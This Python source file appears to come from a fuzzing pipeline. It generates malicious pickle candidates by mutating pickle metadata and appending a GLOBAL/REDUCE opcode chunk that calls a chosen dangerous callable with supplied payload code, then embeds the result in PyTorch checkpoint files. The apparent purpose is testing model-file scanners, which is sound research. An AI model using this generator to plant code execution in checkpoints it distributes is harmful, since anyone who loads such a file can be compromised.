"""T3.3 — Implement Candidate Generator Core.

Combines opcode taxonomy, dangerous-callable registry, and metadata/buffer
sampling to produce syntactically valid malicious pickle candidates.
"""

from __future__ import annotations

import os
import pickle
import random
import struct
from typing import Any

from pipeline.opcodes import parse_pickle, OPCODES_BY_BYTE, OPCODES_BY_NAME, OpcodeCategory, OpcodeClassification
from pipeline.registry import get_all_entries, is_dangerous
from pipeline.templates import inject_payload_into_torch


class CandidateGenerator:
    """Fuzzer candidate generator implementing PickleFuzzer mutation and injection."""

    def __init__(self):
        # Sample values for metadata mutation
        self.sample_strings = [
            "benign", "fuzzed", "", "A" * 10, "A" * 256,
            "admin", "root", "127.0.0.1", "localhost",
        ]
        self.sample_ints = [0, 1, -1, 127, 255, 32767, 65535, 2147483647, -2147483648]
        self.sample_floats = [0.0, 1.0, -1.0, 3.14159, 1e-5, float("inf"), float("-inf"), float("nan")]

    def _mutate_argument(self, op: OpcodeClassification, arg: bytes) -> bytes:
        """Mutate an argument's metadata depending on the opcode classification."""
        if op.category == OpcodeCategory.NO_ARG:
            return b""
            
        try:
            # 1. Mutate Length-Prefixed Strings/Bytes
            if op.category == OpcodeCategory.LENGTH_PREFIXED:
                # Determine new payload
                new_payload = random.choice(self.sample_strings).encode("utf-8")
                length = len(new_payload)
                
                # Format prefix depending on width
                if op.arg_width == 1:
                    prefix = bytes([min(length, 255)])
                    new_payload = new_payload[:255]
                elif op.arg_width == 4:
                    prefix = struct.pack("<I", length)
                elif op.arg_width == 8:
                    prefix = struct.pack("<Q", length)
                else:
                    return arg
                return prefix + new_payload

            # 2. Mutate Fixed-Arg Integers/Floats
            if op.category == OpcodeCategory.FIXED_ARG:
                assert op.arg_width is not None
                if op.name == "BINFLOAT" and op.arg_width == 8:
                    val = random.choice(self.sample_floats)
                    return struct.pack(">d", val)  # BINFLOAT is big-endian
                elif op.name == "BININT" and op.arg_width == 4:
                    val = random.choice(self.sample_ints)
                    return struct.pack("<i", val)
                elif op.name == "BININT1" and op.arg_width == 1:
                    val = random.randint(0, 255)
                    return bytes([val])
                elif op.name == "BININT2" and op.arg_width == 2:
                    val = random.randint(0, 65535)
                    return struct.pack("<H", val)
                return arg

            # 3. Mutate Delimited Literals
            if op.category == OpcodeCategory.DELIMITED:
                # Do not mutate GLOBAL/INST paths to avoid breaking structural imports
                if op.name in ("GLOBAL", "INST"):
                    return arg
                    
                if op.name in ("INT", "LONG"):
                    val = random.choice(self.sample_ints)
                    return f"{val}\n".encode("ascii")
                elif op.name == "FLOAT":
                    val = random.choice(self.sample_floats)
                    return f"{val}\n".encode("ascii")
                elif op.name in ("STRING", "UNICODE"):
                    val = random.choice(self.sample_strings)
                    # Pickle representation format requires quotes and newline
                    return f"'{val}'\n".encode("utf-8")
        except Exception:
            pass
            
        return arg

    def mutate_pickle_bytes(
        self,
        pkl_bytes: bytes,
        payload_code: str,
        dangerous_callable: tuple[str, str] | None = None,
        mutate_meta: bool = True,
        mutation_prob: float = 0.15,
    ) -> bytes:
        """Parse, mutate metadata of, and inject a dangerous payload into a pickle stream."""
        parsed = parse_pickle(pkl_bytes)
        
        # 1. Mutate existing metadata (PickleFuzzer metadata/buffer sampling)
        mutated_parsed = []
        for op, arg in parsed:
            if op.name == "STOP":
                continue  # Skip STOP until we assemble the final stream
                
            if mutate_meta and random.random() < mutation_prob:
                new_arg = self._mutate_argument(op, arg)
                mutated_parsed.append((op, new_arg))
            else:
                mutated_parsed.append((op, arg))

        # 2. Curate and select a dangerous callable
        if dangerous_callable is None:
            entries = get_all_entries()
            if not entries:
                raise ValueError("Dangerous callable registry is empty")
            entry = random.choice(entries)
            module, name = entry.module, entry.name
        else:
            module, name = dangerous_callable

        # 3. Build the malicious injection chunk
        # Format: c<module>\n<name>\n(S'<payload_code>'\ntR0
        injection_parts = []
        
        # c<module>\n<name>\n
        injection_parts.append(OPCODES_BY_NAME["GLOBAL"].code)
        injection_parts.append(f"{module}\n{name}\n".encode("latin1"))
        
        # (S'<payload_code>'\ntR
        injection_parts.append(OPCODES_BY_NAME["MARK"].code)
        injection_parts.append(OPCODES_BY_NAME["SHORT_BINSTRING"].code)
        injection_parts.append(bytes([len(payload_code)]) + payload_code.encode("utf-8"))
        injection_parts.append(OPCODES_BY_NAME["TUPLE"].code)
        injection_parts.append(OPCODES_BY_NAME["REDUCE"].code)
        
        # 0 (POP returned result from stack to maintain stack stability)
        injection_parts.append(OPCODES_BY_NAME["POP"].code)
        
        injection_bytes = b"".join(injection_parts)

        # Reconstruct the stream, inserting the malicious chunk right before STOP
        rebuilt_parts = [op.code + arg for op, arg in mutated_parsed]
        rebuilt_parts.append(injection_bytes)
        rebuilt_parts.append(OPCODES_BY_NAME["STOP"].code)

        rebuilt_bytes = b"".join(rebuilt_parts)
        if len(rebuilt_bytes) > 11 and rebuilt_bytes[0] == 0x80 and rebuilt_bytes[2] == 0x95:
            body_len = len(rebuilt_bytes) - 11
            rebuilt_bytes = rebuilt_bytes[:3] + struct.pack("<Q", body_len) + rebuilt_bytes[11:]
        return rebuilt_bytes

    def generate_candidate_pt(
        self,
        benign_pt_bytes: bytes,
        payload_code: str,
        dangerous_callable: tuple[str, str] | None = None,
        mutate_meta: bool = True,
        mutation_prob: float = 0.15,
    ) -> bytes:
        """Inject a mutated pickle payload into a PyTorch checkpoint file."""
        import tempfile

        # First, generate a malicious pickle payload using a dummy pickle
        dummy_benign = pickle.dumps({})
        malicious_pkl = self.mutate_pickle_bytes(
            pkl_bytes=dummy_benign,
            payload_code=payload_code,
            dangerous_callable=dangerous_callable,
            mutate_meta=mutate_meta,
            mutation_prob=mutation_prob,
        )
        
        # Write input bytes to temporary file
        with tempfile.NamedTemporaryFile(suffix=".pt", delete=False) as f_in:
            f_in.write(benign_pt_bytes)
            in_path = f_in.name
            
        out_path = in_path + ".out.pt"
        
        try:
            inject_payload_into_torch(in_path, out_path, malicious_pkl)
            with open(out_path, "rb") as f_out:
                result_bytes = f_out.read()
        finally:
            try:
                os.remove(in_path)
            except OSError:
                pass
            try:
                os.remove(out_path)
            except OSError:
                pass
                
        return result_bytes
